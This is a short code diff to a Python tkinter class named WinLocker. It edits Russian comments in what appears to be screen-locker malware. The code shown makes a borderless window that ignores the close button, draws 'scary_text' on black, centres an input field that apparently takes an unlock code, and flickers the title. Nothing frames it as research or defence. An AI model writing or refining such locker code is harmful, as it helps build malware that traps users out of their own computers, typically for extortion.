@@ -61,6 +61,7 @@ class WinLocker:
         self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
+        # Основной Canvas для графики (текст слева)
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
@@ -86,7 +87,7 @@ class WinLocker:
         )
         self.canvas.create_text(50, 250, text=scary_text, fill='white', font=('Courier', 14), anchor='w')
         
-        # Поле ввода строго по центру (используем отдельный Frame для точного позиционирования)
+        # Отдельный Frame для поля ввода – строго по центру
         center_frame = tk.Frame(self.win, bg='black')
         center_frame.place(relx=0.5, rely=0.5, anchor='center')
         
@@ -110,7 +111,6 @@ class WinLocker:
             self.entry.delete(0, tk.END)
     
     def animate(self):
-        # Мерцание главной надписи
         if random.random() < 0.1:
             self.canvas.itemconfig("title", fill='gray')
         else:
